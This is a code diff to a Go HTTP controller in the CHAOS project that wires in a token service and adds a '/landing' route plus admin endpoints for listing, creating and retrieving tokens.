@@ -8,6 +8,7 @@ import (
 	"github.com/tiagorlampert/CHAOS/services/auth"
 	"github.com/tiagorlampert/CHAOS/services/client"
 	"github.com/tiagorlampert/CHAOS/services/device"
+	"github.com/tiagorlampert/CHAOS/services/token"
 	"github.com/tiagorlampert/CHAOS/services/url"
 	"github.com/tiagorlampert/CHAOS/services/user"
 )
@@ -21,6 +22,7 @@ type httpController struct {
 	UserService    user.Service
 	DeviceService  device.Service
 	UrlService     url.Service
+	TokenService   token.Service
 }
 
 func NewController(
@@ -33,6 +35,7 @@ func NewController(
 	userService user.Service,
 	deviceService device.Service,
 	urlService url.Service,
+	tokenService token.Service,
 ) {
 	handler := &httpController{
 		Configuration:  configuration,
@@ -43,10 +46,12 @@ func NewController(
 		UserService:    userService,
 		DeviceService:  deviceService,
 		UrlService:     urlService,
+		TokenService:   tokenService,
 	}
 
 	router.NoRoute(handler.noRouteHandler)
 	router.GET("/health", handler.healthHandler)
+	router.GET("/landing", handler.landingHandler)
 	router.GET("/login", handler.loginHandler)
 	router.POST("/auth", authMiddleware.LoginHandler)
 
@@ -85,5 +90,10 @@ func NewController(
 		authGroup.POST("/upload", handler.uploadFileHandler)
 
 		adminGroup.POST("/open-url", handler.openUrlHandler)
+
+		// Token routes
+		adminGroup.GET("/tokens", handler.getTokensHandler)
+		adminGroup.POST("/token/create", handler.createTokenHandler)
+		adminGroup.GET("/token/:id", handler.getTokenByIDHandler)
 	}
 }
